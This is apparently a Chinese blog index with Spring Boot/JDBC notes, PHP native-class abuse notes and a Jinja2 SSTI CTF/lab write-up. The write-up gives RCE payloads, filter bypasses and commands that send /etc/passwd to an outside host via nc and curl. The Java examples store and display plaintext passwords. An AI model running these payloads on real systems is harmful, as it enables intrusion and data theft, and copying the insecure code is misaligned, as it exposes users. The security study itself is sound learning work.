8848spring: thymeleaf: prefix: classpath:/templates/ #指定模板所在目录 check-template-location: true #检查模板路径是否存在 cache: true #是否缓存，开发模式下设为false，避免更改模板还要重启服务，线上要改为true，提高性能 suffix: .html encoding: utf-8 mode: html5 写html模板文件时需要加入语句：&lt;html lang=&quot;en&quot; xmlns:th=&quot;htttp://www.thymeleaf.org&quot;&gt; 使用th表达式插入标签中： 12&lt;td th:text=&quot;${user.name}&quot;&gt;&lt;/td&gt;&lt;td th:text=&quot;${user.age}&quot;&gt;&lt;/td&gt; thymeleaf的循环和判断：12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;!--需要在html语句中加入以下语句：--&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;htttp://www.thymeleaf.org&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Potato&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;table border=&quot;1&quot;&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;成年&lt;/th&gt; &lt;/tr&gt; &lt;tr th:each=&quot;user:${users}&quot;&gt; &lt;td th:text=&quot;${user.name}&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;${user.age}&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;${user.sex}&quot;&gt;&lt;/td&gt; &lt;td th:if=&quot;${user.age&gt;=18}&quot;&gt;是&lt;/td&gt; &lt;td th:if=&quot;${user.age&lt;18}&quot;&gt;否&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 与数据库的连接：配置：在pom文件中添加依赖： 1234567891011&lt;!--springboot整合jdbc模板框架--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--springboot整合mysql驱动类--&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.21&lt;/version&gt;&lt;/dependency&gt; 添加配置文件： 123456datasource: url: jdbc:mysql://localhost:3306/my_db #修改为自己的数据库名 username: root password: driver-class-name: com.mysql.jdbc.Driver 建立service包：UserService.java： 使用jdbc模板 1234567891011121314151617package com.potato.thymelaef.service;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.jdbc.core.JdbcTemplate;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class UserService { @Autowired//添加@Autowired注解 private JdbcTemplate jdbcTemplate;//使用jdbc模板 @RequestMapping(&quot;/insertUser&quot;) public String insertUser(String userName,Integer id,String passWord){ int update = jdbcTemplate.update(&quot;INSERT INTO userInfo values (?,?,?)&quot;,id,userName,passWord);//预编译防sql注入 return update &gt; 0? &quot;success&quot; : &quot;failed&quot;; }} 访问并传参： 但是如果再次插入相同的id会报错，SQL那边的知识：主键 UPDATE,DELETE,INSERT更新语句都是用update方法执行 更完善些：我们简单写一个用户信息注册页面： 在UserService下创建一个RegisterService接口 12345public String RegisterService(String userName,String passWord){ String sql = &quot;INSERT INTO userInfo (username,password) values (?,?)&quot;; int insert = jdbcTemplate.update(sql,userName,passWord); return insert &gt; 0?&quot;注册成功&quot;:&quot;注册失败&quot;;} 这里可以注意到，同样是插入数据的操作，此处与上面案例的区别在于，我们只插入了username和pasword字段的值，那么不是还有个id吗？id怎么办，不会报错吗？是的，会报错。通常情况下id是作为主键，且值不为空，不能重复，但是我们在提交表单时往往不会说去提交一个id传上去，这时候就需要去设置一下，把id设为自动递增： 如果都没设置，默认id不自动递增，会发生什么情况呢？ 出现报错： 1java.sql.SQLException: Field 'id' doesn't have a default value 并且网页出现404 新建一个实体用户类，用于映射数据库中的用户表： 这里以SELECT查询为例： 介绍两个jdbcTemplate下的方法： query()query()：执行查询结果映射为一个列表，下面是基本用法： 1234List&lt;T&gt; query(String sql,RowMapper&lt;T&gt; rowMapper,args) //sql：要执行的sql语句 //rowMapper：行映射器，将结果映射为对象 //args，可选参数，用于传递给sql查询 实例： 在UserService中新建一个InfoDisplay()方法用于将表中所有用户的信息查询后存入一个List&lt;User&gt;对象中， 12345678910public List&lt;User&gt; InfoDisplay(){ String sql = &quot;SELECT * FROM userInfo&quot;; return jdbcTemplate.query(sql,(rs, rowNum) -&gt; new User( rs.getInt(&quot;id&quot;), rs.getString(&quot;userName&quot;), rs.getString(&quot;passWord&quot;) ) );} UserInfoDisplay.java： 123456789101112@Controllerpublic class UserInfoDisplay { @Autowired private UserService userService; @RequestMapping(&quot;/info&quot;) public String userInfo(Model model){ List&lt;User&gt; users = userService.InfoDisplay(); model.addAttribute(&quot;users&quot;,users); return &quot;info1&quot;; }} 直接将查询数据的结果映射到模板的users里， 再看模板info1.html： 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;UserInfo&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table border=&quot;1&quot;&gt; &lt;tr&gt; &lt;th&gt;id&lt;/th&gt; &lt;th&gt;username&lt;/th&gt; &lt;th&gt;password&lt;/th&gt; &lt;/tr&gt; &lt;tr th:each=&quot;user:${users}&quot;&gt; &lt;td th:text=&quot;${user.id}&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;${user.userName}&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;${user.passWord}&quot;&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;a href=&quot;http://localhost:8848/login&quot;&gt;登录&lt;/a&gt;&lt;a href=&quot;http://localhost:8848/register&quot;&gt;注册&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 循环users对象，将其信息渲染到前端 queryForObject()queryForObject()：执行查询返回单个结果，若无结果或多结果，将抛出异常，下面是基本用法： 12T queryForObject(String sql,RowMapper&lt;T&gt; rowMapper,args) //参数解释同query 具体实例，以一个验证登录为例： 新建Service: UserService.java： 123456789101112131415161718192021@Servicepublic class UserService { @Autowired//添加@Autowired注解 private JdbcTemplate jdbcTemplate;//使用jdbc模板 public User getUserByUserName(String userName){ String sql = &quot;SELECT * FROM userInfo WHERE username = ?&quot;; return jdbcTemplate.queryForObject(sql,(rs,rowNum) -&gt; new User( rs.getInt(&quot;id&quot;), rs.getString(&quot;userName&quot;), rs.getString(&quot;passWord&quot;) ),userName ); } public static boolean verifyUser(User user,String passWord){ return user != null &amp;&amp; user.getPassWord().equals(passWord); }} 此处从数据库查询函数queryForObject()只返回一个列表对象；还定义了一个登陆验证的函数，传入一个User对象，如果User对象不为空且其password值与传入的password值相同返回为真。明显，一会我们要把queryForObject()方法返回的User对象传入verifyUser()方法中。 新建一个Controller： 123456789101112131415161718@Controllerpublic class LoginController { @Autowired//此处注释一定记住 private UserService userService; @RequestMapping(&quot;/login&quot;) public String login(@RequestBody LoginRequest request,Model model){ //RequestBody指示方法参数从HTTP主体获取，如果是参数则用@RequestParam注释 User user = userService.getUserByUserName(request.getUserName()); if (UserService.verifyUser(user,request.getPassWord())){ model.addAttribute(&quot;status&quot;,&quot;alert(\\&quot;登陆成功\\&quot;)&quot;); }else { model.addAttribute(&quot;status&quot;,&quot;alert(\\&quot;登陆失败\\&quot;)&quot;); } return &quot;index1&quot;; }} 与模板文件放在一起看： 1234567891011&lt;!DOCTYPE html&gt;&lt;!--需要在html语句中加入以下语句：--&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;htttp://www.thymeleaf.org&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Potato&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script th:utext=&quot;${status}&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; controller中有几个要注意的点： @RequestBody&amp;@RequestParam：@RequestBody，指示方法参数从HTTP主体获取，如果是从参数中获取则用@RequestParam注释 param的情况下： 12345678910111213141516171819@Controllerpublic class LoginController { @Autowired//此处注释一定记住 private UserService userService; @RequestMapping(&quot;/login&quot;) public String login(@RequestParam(&quot;userName&quot;) String userName,@RequestParam(&quot;passWord&quot;) String passWord,Model model){ //R@RequestParam(&quot;paramName&quot;) string paramValue代表将paramName请求参数的值映射到paramValue这个方法参数上 User user = userService.getUserByUserName(userName); if (UserService.verifyUser(user,passWord)){ model.addAttribute(&quot;status&quot;,&quot;alert(\\&quot;登陆成功\\&quot;)&quot;); }else { model.addAttribute(&quot;status&quot;,&quot;alert(\\&quot;登陆失败\\&quot;)&quot;); } return &quot;index1&quot;; }} 如下传值： body的情况下： @Controllerpublic class LoginController { @Autowired//此处注释一定记住 private UserService userService; 1234567891011@RequestMapping(&quot;/login&quot;)public String login(@RequestBody LoginRequest request,Model model){ //RequestBody指示方法参数从HTTP主体获取，如果是参数则用@RequestParam注释 User user = userService.getUserByUserName(request.getUserName()); if (UserService.verifyUser(user,request.getPassWord())){ model.addAttribute(&quot;status&quot;,&quot;alert(\\&quot;登陆成功\\&quot;)&quot;); }else { model.addAttribute(&quot;status&quot;,&quot;alert(\\&quot;登陆失败\\&quot;)&quot;); } return &quot;index1&quot;;} 上例中LoginRequest实体类： th:utext，此处th表达式不是用text而是utext，原因是text中的html实体会被转义掉，如果希望渲染什么js语句，就要使用utext 以下是使用th:text的渲染结果： 删除数据和更新数据时同理， 异常处理：值得一提的是，在进行更新操作时有时候需要验证账号密码，如果未查询到结果，直接判断user是否为null不足以处理抛出的EmptyResultDataAccessException异常，需要用异常处理语句： 123456789101112131415public String CancelUser(String userName,String passWord){ String sql = &quot;DELETE FROM userInfo WHERE username = ?&quot;; try { User user = getUserByUserName(userName); if (!user.getPassWord().equals(passWord)){ return &quot;密码错误&quot;; } else if (user == null){ return &quot;不存在该用户&quot;; } int delete = jdbcTemplate.update(sql,userName); return delete &gt; 0 ? &quot;已删除用户&quot;+userName : &quot;删除失败&quot;; }catch (EmptyResultDataAccessException e){ return &quot;不存在该用户&quot;; } 不只是更新操作，任何可能出现异常的操作都最好使用异常处理 整合Mybatis框架依赖的引入：mybatis版本根据官网选择 123456789101112&lt;!--Mybatis依赖的引入--&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.0&lt;/version&gt;&lt;/dependency&gt;&lt;!--MySQL依赖的引入--&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.21&lt;/version&gt;&lt;/dependency&gt; 配置：由于存在mysql连接，故需要配置datasource：123456datasource: url: jdbc:mysql://localhost:3306/my_java_db #修改为自己的数据库名 username: root password: driver-class-name: com.mysql.jdbc.Driver 接口创建：在mapper包下创建一个接口： @MapperSc","link":"/2023/04/24/java-note/"},{"title":"php原生类","text":"PHP原生类异常原生类error:(PHP7,8)Exception:(PHP5,7,8)12345678910&lt;?phphighlight_file(__FILE__);if($_GET['dir']){ $dir = $_GET['dir']; $a = new Error($dir); echo $a;} 那，既然这样，那我有个大胆的想法。。 1234567891011&lt;?phphighlight_file(__FILE__);if($_GET['dir']){ $dir = $_GET['dir']; $class = $_GET['class']; $a = new $class($dir); echo $a;} 当然通常环境下，开发者通常也不会在程序内留下可控的创建新类对象，可能会有以下的情况： 12345678&lt;?phphighlight_file(__FILE__);if($_GET['dir']){ $dir = $_GET['dir']; $a = unserialize($dir); echo $a;} 这时候我们编写poc： 123456&lt;?php$a = new Error(&quot;&lt;?php phpinfo();?&gt;&quot;);$b = serialize($a);echo urlencode($b);//输出：/*O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A36%3A%22C%3A%5CUsers%5Clinfe%5CDesktop%5Cclass%5Cser.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D*/ 原生类读取目录：DirectoryIterator:(PHP5,7,8)读取目录下单个文件(目录)名，若需要全部打印出来要循环 123456789101112&lt;?phphighlight_file(__FILE__);if($_GET['dir']){ $dir = $_GET['dir']; $a = new FilesystemIterator($dir); foreach($a as $f){ echo($f-&gt;__toString().'&lt;br&gt;'); }} FilesystemIterator:(PHP 5&gt;=5.3,7,8,DirectoryIterator的子类)DirectoryIterator和FilesystemIterator均有一个__toString()方法，将获取的结果转为字符串 123456789101112&lt;?phphighlight_file(__FILE__);if($_GET['dir']){ $dir = $_GET['dir']; $a = new DirectoryIterator($dir); foreach($a as $f){ echo($f-&gt;__toString().'&lt;br&gt;'); }} 结合glob://伪协议可绕过open_basedir的限制： GlobIterator:(PHP 5&gt;=5.3,7,8)123456789101112&lt;?phphighlight_file(__FILE__);if($_GET['dir']){ $dir = $_GET['dir']; $a = new GlobIterator($dir); foreach($a as $f){ echo($f-&gt;__toString().'&lt;br&gt;'); }} 读取文件：SplFileObject:123456789101112&lt;?phphighlight_file(__FILE__);if($_GET['dir']){ $dir = $_GET['dir']; $a = new SplFileObject($dir); foreach($a as $f){ echo($f); }} SoapClient:ReflectionMethod:","link":"/2023/09/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"},{"title":"some_idea","text":"Some_Ideas","link":"/2023/11/30/some-idea/"},{"title":"redis","text":"Redis学习笔记","link":"/2023/11/28/redis/"},{"title":"SSTI","text":"SSTIsources:https://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters https://jinja.palletsprojects.com/en/3.1.x/templates/ https://dormousehole.readthedocs.io/en/latest/ https://xz.aliyun.com/t/9584 2023FCTF热身赛filechecker_mini打开题目，让我们上传一个文件： 桌面上随便丢了个php文件进去提交看看会有啥情况： 判断文件类型，(MIME绕过预定) 附件下载下来先看源码： index.html： 可以看出该网页使用模块渲染将result值渲染进index对应位置，那么就看下后端代码app.py： 123456789101112131415161718192021222324252627282930313233343536373839from flask import Flask, request, render_template, render_template_stringfrom waitress import serveimport osimport subprocessapp_dir = os.path.split(os.path.realpath(__file__))[0]app = Flask(__name__)app.config['UPLOAD_FOLDER'] = f'{app_dir}/upload/'@app.route('/', methods=['GET','POST'])def index(): try: if request.method == 'GET': return render_template('index.html',result=&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;) elif request.method == 'POST': f = request.files['file-upload'] filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename) if os.path.exists(filepath) and &quot;..&quot; in filepath: return render_template('index.html', result=&quot;Don't (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;) else: f.save(filepath) file_check_res = subprocess.check_output( [&quot;/bin/file&quot;, &quot;-b&quot;, filepath], shell=False, encoding='utf-8', timeout=1 ) os.remove(filepath) if &quot;empty&quot; in file_check_res or &quot;cannot open&quot; in file_check_res: file_check_res=&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot; return render_template_string(file_check_res) except: return render_template('index.html', result='Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ')if __name__ == '__main__': serve(app, host=&quot;0.0.0.0&quot;, port=3000, threads=1000, cleanup_interval=30) 上面大家都用render_template()就你爱用render_template_string()是吧（指指点点，一眼模板注入，那么我们就希望file_check_res里有我们能够执行的rce代码。file_check_res哪来的？倒退往上看。 12345678f.save(filepath)file_check_res = subprocess.check_output( [&quot;/bin/file&quot;, &quot;-b&quot;, filepath], shell=False, encoding='utf-8', imeout=1 )os.remove(filepath) 先保存filepath这样一个文件，subprocess.check_output(command)返回Linux命令行输出，然后再把filepath文件删除，那么这里的file_check_res就是file -b {filepath}的结果。往上看filepath其实就是将上传文件目录的绝对路径和该文件的文件名拼接起来来标定用户上传的这个文件在容器中的绝对位置。逻辑搞明白了，现在的重点就在于如何对一个文件使用file -b 命令后返回值中能回显我们所期望的值。动手操作下flie命令，发现其不会输出文件的内容只会输出其类型， 代码中的-b参数作用： 1-b #列出辨识结果时，不显示文件名称。 所以在文件名上动手脚的想法也破灭了（悲。 卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。 点开tests里面是各种针对该file命令的测试结果 这8个分别分别是在文本中写入bash脚本的4种情况和对应的用file命令执行的输出结果，可以看出如果文本内容为#!/usr/bin开头的那么输出结果中会显示文本中的其他内容。 本地做测试：创建一个文本文件修改内容如下 测试结果如下： 显而易见，输出可控，可以进行模板渲染。新建一个文本文件内容如下，上传文件 存在ssti漏洞，开始利用，调用os模块 调用popen()方法。 上传文件，获取flag。 ssti_labs搭建踩的坑： pip python 还有各种库版本之间的冲突，我pip和python全用的3，python版本是3.8。出现ImportError错误导致无法导入’soft_unicode’模块是由于markupsafe库的版本引起的，在py3.8中markupsafe库中的soft_unicode模块被移除，先升级injja2和markupsafe库到最新版本确保它们和python3.8兼容，pip install --upgrade jijna2markupsafe。还有itsdangerous库中的json模块也被移除，同上，pip install --upgrade itsdangerous，然后还是不行，是由于flask和itsdangerous版本之间的兼容性问题，将flask和itsdangerous降级到与py3.8兼容的较旧版本pip install flask==1.1.4 itsdangerous==1.1.0，成功部署完之后，又遇到问题，运行python3 app.py后，显示* Running on http://127.0.0.1:5001/ (Press CTRL+C to quit)但是却无法通过公网ip访问到。gpt debug，默认情况下flask只会绑定到回环地址，没法绑定到公网ip，所以无法外部访问，最后一行改成app.run(host='0.0.0.0',port=5001,debug='True')，然后就是，千万别用root跑(悲)，不然会被日的很惨(感谢L1ao学长的指出)，当然就算创建新用户跑，也面临着提权被干的风险，所以，最好还是用容器吧，还学了点别的小知识 kill -9 PID：强制kill进程 adduser your_username：在服务器上创建一个普通用户 chown your_username:your_username app.py：将app.py的所有权转移到普通用户 su - your_username：用普通用户身份登录 level1漏洞存在 __class__一个对象的类的引用，用于实例化对象，这里是字符串对象，obj.__class__返回该对象所属类，对于类本身，Class.__class__返回它的元类 当前类的基类，这里有三种获取方法，__base__(获取直接父类)，__bases__(Class.__bases__返回Class的元组，包含它的直接父类)，__mro__，__mro__方法返回一个类的方法解析顺序，其中的类是在方法解析的过程中在寻找父类时需要考虑的类。要注意获取到的对象是多个还是单个，下面使用__subclasses__()时要注意的 有这些类继承的方法，我们就可以从任何一个变量(字符串、数组，整型，配置(config)，甚至文件本身(self)等等)，回溯到最顶层基类（&lt;class'object'&gt;）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。 __subclasses__()方法，直接返回一个类的所有子类列表，我们已经在最顶层基类了，看&lt;class'object'&gt;下有哪些子类，很多，SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。 可通过角标查看 ，在python2中，子类file类可直接用于读取文件： 编写脚本寻找file类对应角标： 12345678910111213141516import requestsimport html#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码url = 'http://124.70.99.199:5001/level/1'for i in range(1,300): payload = &quot;&quot;&quot;{{''.__class__.__base__.__subclasses__()[%s]}}&quot;&quot;&quot;%i r = requests.post(url,data={&quot;code&quot;:payload}).text r = html.unescape(r) if &quot;file&quot; in r: print(i) #这里假设寻找到file类位于50位 1{{[].__class__.__base__.__subclasses__()[50]('/etc/passwd').read()}} 但是现在基本上都用py3，包括我的靶场，所以有另外一种读文件方式，我们可以用&lt;class '_frozen_importlib_external.FileLoader'&gt; 这个类去读取文件。微调脚本： 12345678910111213141516import requestsimport html#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码url = 'http://124.70.99.199:5001/level/1'for i in range(1,300): payload = &quot;&quot;&quot;{{''.__class__.__base__.__subclasses__()[%s]}}&quot;&quot;&quot;%i r = requests.post(url,data={&quot;code&quot;:payload}).text r = html.unescape(r) if &quot;FileLoader&quot; in r: print(i) #这里寻找到file类位于79下标 get_data方法读文件： 1{{''.__class__.__bases__[0].__subclasses__()[79][&quot;get_data&quot;](0,&quot;/flag&quot;)}} 玩点更有意思的，getshell 内建函数： 在python解释器启动时，即使没有创建任何变量或函数，无需导入任何模块，有很多函数可以使用，叫做内建函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#以下是 Python 3.x 版本中的所有内置函数的列表：abs()all()any()ascii()bin()bool()breakpoint()bytearray()bytes()callable()chr()classmethod()compile()complex()delattr()dict()dir()divmod()enumerate()eval()####thisexec()####and this#上面两个能够执行任意python代码，当然也就能导入os库，调用系统命令filter()float()format()frozenset()getattr()globals()hasattr()hash()help()hex()id()input()int()isinstance()issubclass()iter()len()list()locals()map()max()memoryview()min()next()object()oct()open()ord()pow()print()property()range()repr()reversed()round()set()setattr()slice()sorted()staticmethod()str()sum()super()tuple()type()vars()zip()import() __builtins__：在python中，__builtins__是一个特殊模块，它包含了python内置的所有函数、异常对象。以一个集合的形式查看其引用，__builtins__ 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。 __globals__ 是一个函数对象特有的属性，它是一个字典，记录了该函数所在文件中的全局变量的值。当函数被定义时，它会捕获所在文件的全局命名空间（global namespace），包括所有的全局变量。这些全局变量的值会被保存在 __globals__ 属性所指向的字典中。在 Python 中，每个函数都有一个 __globals__ 属性，它指向一个字典，包含函数所在文件的全局变量。这使得函数可以在执行时访问其所在文件的全局变量，即使它们定义在函数之外。 __import__()：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 __import__() 来动态载入，就是 import。语法：__import__(模块名) __init__：构造函数，实例化类时自动调用 有要注意的点： 从上面的内建函数列表可以找到eval和exec这俩函数， 写脚本找有这俩函数的子类： 123456789101112131415161718import requestsimport html#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码url = 'http://124.70.99.199:5003/level/1'for i in range(0,500): payload = &quot;&quot;&quot;{{''.__class__.__base__.__subclasses__()[%s].__init__.__globals__.__builtins__}}&quot;&quot;&quot;%i evalClass = &quot;&quot;&quot;{{''.__class__.__base__.__subclasses__()[%s]}}&quot;&quot;&quot;%i r = requests.post(url,data={&quot;code&quot;:payload}).text evalclass_r = requests.post(url,data={&quot;code&quot;:evalClass}).text r = html.unescape(r) evalclass_r = html.unescape(evalclass_r) if &quot;eval&quot; in r: print(i,end='\\n') print(evalclass_r) 这里符合条件的子类也是相当多 相当多，我们随便取个数继续构造payload： 1{{''.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__['eval'](&quot;__import__('os').popen('whoami').read()&quot;)}} 后面发现不一定要使用__builtins__模块，还可以试试别的模块 123456# __builtins__{{().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__['__import__']('os').popen('cat flag').read()}}# popen{{().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat flag').read()}}# os{{().__class__.__base__.__subclasses__()[213].__init__.__globals__['os'].popen('cat flag').read()}} level2被警告了 这样又没事 这样也可 左双括号被ban了 1234567{% ... %} for Statements {{ ... }} for Expressions to print to the template output{# ... #} for Comments not included in the template output# ... # for Line Statements jinja2模板语法中可不止{{}}，还有{%%}，用于插入逻辑控制代码，其中的代码会在渲染模板时被执行， 在 Jinja2 模板引擎中，{%%} 中的控制结构包括以下几种，和解题没关系的也顺便加下，多学百益无一害： {% if ... %}` 和 `{% endif %}：条件语句，用于根据条件执行不同的代码块。 {% for ... %}` 和 `{% endfor %}：循环语句，用于遍历一个可迭代对象的元素。 {% while ... %}` 和 `{% endwhile %}：循环语句，用于根据条件循环执行代码块。 {% else %}：与 if 或 for 配合使用，在没有满足条件或循环结束时执行的代码块。 {% elif ... %}：与 if 配合使用，用于添加额外的条件分支。 {% set ... %}：变量赋值语句，用于在模板中定义变量。 {% macro ... %}` 和 `{% endmacro %}：宏定义，用于在模板中定义可复用的代码片段。 {% call ... %}` 和 `{% endcall %}：调用宏，用于调用已定义的宏。 {% block ... %}` 和 `{% endblock %}：块定义，用于在模板继承中重写内容。 {% extends ... %}：模板继承，用于继承其他模板，并重写其中的块内容。 {%include ... %}：引入外部模板 陌生的那些用一个例子说明： 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;{{ title }}&lt;/title&gt;&lt;/head&gt;&lt;body&gt; {% if user %} &lt;h1&gt;Hello, {{ user }}!&lt;/h1&gt; {% else %} &lt;h1&gt;Hello, Guest!&lt;/h1&gt; {% endif %} {% macro format_name(first, last) %} {{ first }} {{ last }} {% endmacro %} &lt;p&gt;Full Name: {{ format_name('John', 'Doe') }}&lt;/p&gt; {% macro greet(name) %} &lt;h1&gt;Hello,{{name}}!&lt;/h1&gt; {%endmacro%} {% call greet('Jhon') %} {% call greet('Alice') %} {% block content %} &lt;p&gt;This is the default content.&lt;/p&gt; {% endblock %} {% include 'footer.html' %}&lt;/body&gt;&lt;/html&gt; while，set: 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;While Loop Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt; {% set counter = 1 %} &lt;ul&gt; {% while counter &lt;= 5 %} &lt;li&gt;Item {{ counter }}&lt;/li&gt; {% set counter = counter + 1 %}&lt;!--注意这里要用set--&gt; {% endwhile %} &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 最后构造payload， 123456789/*逻辑语句会执行，但是不输出，因此需要回带到自己vps*/{%if (''.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__['eval'](&quot;__import__('os').popen('cat /etc/passwd|nc 124.70.99.199 7890').read()&quot;))%}{%endif%}//nc实现回带{%if (''.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__['eval'](&quot;__import__('os').popen('curl http://124.70.99.199:7890/?`cat /etc/passwd`').read()&quot;))%}{%endif%}//curl实现回带{%for i in (''.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__['eval'](&quot;__import__('os').popen('cat /etc/passwd|nc 124.70.99.199 7890').read()&quot;))%}{%endfor%}//curl实现同上/*感觉可能的实现方式都试了一遍，最后发现set也可*/{%set a = (''.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__['eval'](&quot;__import__('os').popen('cat /etc/passwd|nc 124.70.99.199 7890').read()&quot;))%} 看别人博客时发现print居然也能写进来诶，自己想了想，既然能够执行为啥不能用print呢， 1{%print(''.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__['eval'](&quot;__import__('os').popen('cat /etc/passwd').read()&quot;))%} level3emmm，上面出了点小趣事，涉及到jinja2的渲染语句还是都打上代码块吧呜呜（，传博客的时候发现报错 ，小问题，都打上代码块就好了 输入1， 只会显示语法正确与否，不会回显，那好办，上一题回带vps的payload直接拿下来用， payload： 1{%if (''.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__['eval'](&quot;__import__('os').popen('cat /etc/passwd|nc 124.70.99.199 7890').read()&quot;))%}{%endif%} 还看到了别人的姿势， 1{% for i in ''.__class__.__mro__[-1].__subclasses__() %}{% if i.__name__=='Popen' %}{{ i.__init__.__globals__['os'].popen('cat /etc/passwd|nc 124.70.99.199 7890').read()}}{% endif %}{% endfor %} level4中括号被过滤了，查Jinja官方文档，variable开头就直接说了 你可以使用点（ . ）来访问变量的属性，作为替代，也可以使用所谓的“下标”语 法（[]），如果点被过滤，可以用中括号绕过。 中括号被过滤了呢，这里的代码写出了一种特殊的方法__getitem__，用于获取foo中的item 我们可以用__getitem__()来获取字典中的键值，看了别人的博客，知道pop()方法也可以取键值，但是会删除键，不到万不得已不要用 payload： 1234567{{''.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.__builtins__.__getitem__(&quot;__import__&quot;)('os').popen('cat /etc/passwd').read()}}{{''.__class__.__base__.__subclasses__().pop(399).__init__.__globals__.__builtins__.pop(&quot;__import__&quot;)('os').popen('cat /etc/passwd').read()}}{{''.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.get('__builtins__').__getitem__(&quot;__import__&quot;)('os').popen('cat /etc/passwd').read()}} ##get()返回指定键的值，如果值不在字典中返回default值{{''.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.setdefault('__builtins__').__getitem__(&quot;__import__&quot;)('os').popen('cat /etc/passwd').read()}} ##setdefault(),和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default level5单双引号被过滤 这个是真不会，去网上找别人的题解 引号过滤有主要两种绕过方式： 1234#方法一：request对象(jinja2){{1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).popen(request.args.arg3).read()}}#然后GET传递a，b，c参数用于替代引号内的几样字符串#?a=__import__&amp;b=os&amp;c=cat /etc/passwd request.values返回无论是GET还是POST请求的参数，当然flak框架内支持request.form用于传递post参数 cookie中传参也可以 举一反三，看到别人的博客cookie可以塞，ua头里是不是也可以塞？去学了下jinja2获取ua头的方式(用法request.user_agent.string获取用户完整的ua字符串，request.user_agent.browser获取浏览器信息，request.user_agent.platform获取操作系统信息)，还真行 那自己创一个请求头也可以喽？还真行，真有意思 